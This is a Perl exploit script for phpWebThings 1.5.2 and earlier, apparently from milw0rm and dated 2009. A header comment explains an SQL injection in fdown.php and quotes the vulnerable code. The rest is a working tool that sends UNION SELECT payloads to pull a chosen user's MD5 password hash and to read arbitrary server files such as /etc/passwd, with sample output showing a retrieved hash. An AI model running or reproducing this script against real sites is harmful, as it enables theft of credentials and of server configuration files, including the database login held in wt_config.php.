<html><head><title>phpWebThings <= 1.5.2 MD5 Hash Retrieve/File Disclosure Exploit</title></head><pre>#!/usr/bin/perl
                                                                                     
################################################################################################### 
# phpWebThings &lt;= 1.5.2 MD5 Hash Retrieve / File Disclosure Remote Exploit                        # 
#                                                                                                 # 
# by staker                                                                                       # 
# ------------------------------                                                                  # 
# mail: staker[at]hotmail[dot]it                                                                  # 
# url: http://phpwebthings.nl                                                                     # 
# ------------------------------                                                                  #
#                                                                                                 #                        
# NOTE:                                                                                           #
# 1. it works regardless of php.ini settings                                                      #
# 2. wt_config.php contains mysql login                                                           #
#                                                                                                 #
# short explanation:                                                                              #
# ----------------------------------------------------                                            #
# phpWebThings contains a flaw that allows an attacker                                            #
# to carry out an SQL injection attack. The issue is                                              #
# due to the fdown.php script not properly sanitizing                                             #
# user-supplied input to the 'id' variable. This may                                              #
# allow an attacker to inject or manipulate                                                       #
# SQL queries in the backend database (php.ini indep)                                             #
# ----------------------------------------------------                                            #
#                                                                                                 #
# [file: fdown.php]                                                                               #
# ------------------------------------                                                            #
#                                                                                                 #
# &lt;?php                                                                                           #
# include_once(&quot;core/main.php&quot;);                                                                  #
#                                                                                                 #
# $ret = db_query(&quot;select file from {$config[&quot;prefix&quot;]}_forum_msgs where cod={$_REQUEST[&quot;id&quot;]}&quot;); #
# $row = db_fetch_array($ret);                                                                    #
# header('HTTP/1.1 200 OK');                                                                      #
# header('Date: ' . date(&quot;D M j G:i:s T Y&quot;));                                                     #
# header('Last-Modified: ' . date(&quot;D M j G:i:s T Y&quot;));                                            #
# header(&quot;Content-Type: application/force-download&quot;);                                             #
# header(&quot;Content-Lenght: &quot; . (string)(filesize(&quot;var/forumfiles/{$row[&quot;file&quot;]}&quot;)));               #
# header(&quot;Content-Transfer-Encoding: Binary&quot;);                                                    #
# header(&quot;Content-Disposition: attachment; filename={$row[&quot;file&quot;]}&quot;);                             #
# readfile(&quot;var/forumfiles/{$row[&quot;file&quot;]}&quot;);                                                      #
#                                                                                                 #
# ?&gt;                                                                                              #
#                                                                                                 #
# -------------------------------------                                                           #
#                                                                                                 #
# yeat@snippet:~/Desktop$ perl a.pl localhost/cms -c 1                                            #
# [*--------------------------------------------------------------------*]                        #
# [* phpWebThings &lt;= 1.5.2 MD5 Hash Retrieve / File Disclosure Exploit  *]                        #
# [*--------------------------------------------------------------------*]                        #
# [* Usage: perl web.pl [target + path] [OPTIONS]                       *]                        #
# [*                                                                    *]                        #
# [* Options:                                                           *]                        #
# [* [files] -d ../../../../../../etc/passwd                            *]                        #
# [* [hash.] -c user_id                                                 *]                        #
# [* [table] -t set a table prefix (default: wt)                        *]                        #
# [*--------------------------------------------------------------------*]                        #
# [* MD5 Hash: f2c79ad3d1f03ba266dc0a85e1266671                                                   #
#                                                                                                 #
# ----------------------------------------------------------                                      #
# Today is: 12 June 2009                                                                          #
# Location: Italy,Turin.                                                                          #  
# http://www.youtube.com/watch?v=E78BGajeuAI&amp;feature=related                                      #
# ----------------------------------------------------------                                      #
###################################################################################################

use LWP::UserAgent;
use Getopt::Long;

&amp;phpWebThings::init;

my ($files,$admin,$ua_lib,$domain,$table);

$domain  = $ARGV[0] || exit(0);


$ua_lib = LWP::UserAgent-&gt;new(
                               timeout      =&gt; 5,
                               max_redirect =&gt; 0,
                               agent        =&gt; 'Mozilla/4.0 (compatible; Lotus-Notes/5.0; Windows-NT)',
                             ) || die $!;  

GetOptions(
           'p=s' =&gt; \$proxy,
           'd=s' =&gt; \$files,
           'c=i' =&gt; \$admin,
           't=s' =&gt; \$table,
         );
         

die(&amp;phpWebThings::Exploit);
  

sub phpWebThings::Exploit()
{
       return Disclose::File($files) if defined $files;
       return Retrieve::Hash($admin) if defined $admin;
}       
               
       
sub Disclose::File
{
      my $filename = $_[0] || die $!;
      
      my $keywords = &quot;\x2F\x66\x64\x6F\x77\x6E\x2E\x70\x68\x70&quot;;
      
      my $response = $ua_lib-&gt;post(parse::URL($domain.$keywords),
                     [ id =&gt; &quot;1/**/union/**/select/**/0x&quot;.Hex::convert($filename).&quot;#&quot; ]);
      
      if ($response-&gt;status_line =~ /^(302|200|301)/) {
            return $response-&gt;content;
      }
      else {
            return $response-&gt;as_string;
      }            
}
       
sub Retrieve::Hash()
{
       my $user_id = $_[0] || die $!;
        
       my $keywords = &quot;\x2F\x66\x64\x6F\x77\x6E\x2E\x70\x68\x70&quot;; 
       
       my $prefix = (defined $table) ? $table : 'wt';
            
       my $response = $ua_lib-&gt;post(parse::URL($domain.$keywords),
                     [ id =&gt; &quot;1 UNION SELECT password FROM ${prefix}_users WHERE uid=$user_id#&quot; ]);     
      
      if ($response-&gt;status_line =~ /^(302|200|301)/) 
      {
            if ($response-&gt;content =~ /([0-9a-f]{32})/) {
                  return &quot;[* MD5 Hash: $1\n&quot;;
            }         
      }
      else {
            return $response-&gt;as_string;
      }                           
} 
          

sub Hex::convert()
{
       my $string = shift @_ || die $!;
       
       return unpack(&quot;H*&quot;,$string);
}       
         
      
sub parse::URL()
{
        my $string = shift @_ || die($!);
        
        if ($string !~ /^http:\/\/?/i) {
                $string = 'http://'.$string;
        }
        
        return $string;

}



sub phpWebThings::init
{
       print  &quot;[*--------------------------------------------------------------------*]\n&quot;.
              &quot;[* phpWebThings &lt;= 1.5.2 MD5 Hash Retrieve / File Disclosure Exploit  *]\n&quot;.
              &quot;[*--------------------------------------------------------------------*]\n&quot;. 
              &quot;[* Usage: perl web.pl [target + path] [OPTIONS]                       *]\n&quot;.
              &quot;[*                                                                    *]\n&quot;.
              &quot;[* Options:                                                           *]\n&quot;.
              &quot;[* [files] -d ../../../../../../etc/passwd                            *]\n&quot;.
              &quot;[* [hash.] -c user_id                                                 *]\n&quot;.
              &quot;[* [table] -t set a table prefix (default: wt)                        *]\n&quot;.
              &quot;[*--------------------------------------------------------------------*]\n&quot;;
}   

# milw0rm.com [2009-06-12]</pre></html>